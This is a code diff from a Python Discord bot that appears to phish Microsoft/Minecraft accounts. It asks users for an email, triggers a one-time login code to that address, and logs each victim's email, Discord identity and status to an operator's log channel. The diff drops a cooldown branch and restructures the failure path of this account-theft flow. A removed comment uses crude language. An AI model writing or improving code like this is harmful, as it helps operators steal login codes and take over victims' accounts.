@@ -51,29 +51,6 @@ class MyModalOne(ui.Modal):
         # Sends OTP/Auth code
         emailInfo = await sendAuth(self.session, email)
         print(emailInfo)
-
-        # Microsoft raping otp requests
-        # Can be fixed since the latest otp sent still works
-        if len(emailInfo) == 1:
-            await logs_channel.send(
-                embed = Embed(
-                    title = f"User | {interaction.user.name} ({interaction.user.id})",
-                    description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | Email OTP Cooldown```",
-                    timestamp = datetime.datetime.now(),
-                    colour = 0xFF5C5C,                         
-                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user)
-            )
-
-            await interaction.followup.send(
-                    embed = Embed(
-                    title = embeds["cooldown_otp"][0],
-                    description = embeds["cooldown_otp"][1],
-                ),
-                ephemeral = True
-            )
-
-            return
         
         # Email does not exist (ifExistsResults == 1 can be used as an alternative)
         if "Credentials" not in emailInfo:
@@ -269,26 +246,25 @@ class MyModalOne(ui.Modal):
             ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}")
 
             await logs_channel.send(embed = sucessEmbed, view = ButtonOptions(interaction.user))
-        
-        else:
-
-            await logs_channel.send(
-                embed = Embed(
-                    title = f"User | {interaction.user.name} ({interaction.user.id})",
-                    description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | No OTP methods found```",
-                    timestamp = datetime.datetime.now(),
-                    colour = 0xFF5C5C                  
-                ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
-                view = ButtonOptions(interaction.user)  
-            )
-
-            await interaction.followup.send(
-                embed = Embed(
-                    title = embeds["failed_otp"][0],
-                    description = embeds["failed_otp"][1],
-                ),
-                view = ButtonViewThree(),
-                ephemeral = True
-            )
-
             return
+        
+        await logs_channel.send(
+            embed = Embed(
+                title = f"User | {interaction.user.name} ({interaction.user.id})",
+                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | No OTP methods found```",
+                timestamp = datetime.datetime.now(),
+                colour = 0xFF5C5C                  
+            ).set_thumbnail(url= f"https://visage.surgeplay.com/full/512/{username}"),
+            view = ButtonOptions(interaction.user)  
+        )
+
+        await interaction.followup.send(
+            embed = Embed(
+                title = embeds["failed_otp"][0],
+                description = embeds["failed_otp"][1],
+            ),
+            view = ButtonViewThree(),
+            ephemeral = True
+        )
+        
+        return
